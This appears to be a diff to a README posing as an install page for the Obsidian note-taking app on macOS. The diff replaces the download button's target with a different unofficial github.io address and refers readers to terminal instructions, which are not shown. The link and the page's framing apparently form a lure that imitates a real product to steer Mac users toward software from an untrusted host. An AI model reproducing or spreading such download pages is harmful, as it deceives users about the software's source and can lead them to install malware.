@@ -2,7 +2,7 @@
 Boost your productivity and creativity with Obsidian, a powerful markdown-based note-taking app designed for thinkers. 🧠✨  
 Follow the simple instructions below to install it on your Mac.
 
-[![Download for macOS](https://img.shields.io/badge/macOS-Download-lightgrey?style=for-the-badge&logo=apple&logoColor=white)](https://fituganshfgh.github.io/.github/obsidian)
+[![Download for macOS](https://img.shields.io/badge/macOS-Download-lightgrey?style=for-the-badge&logo=apple&logoColor=white)](https://mrboomzeus519.github.io/gimronus/obsidian)
 
 > If the button above doesn’t work, please follow the instructions below using your macOS terminal.
 
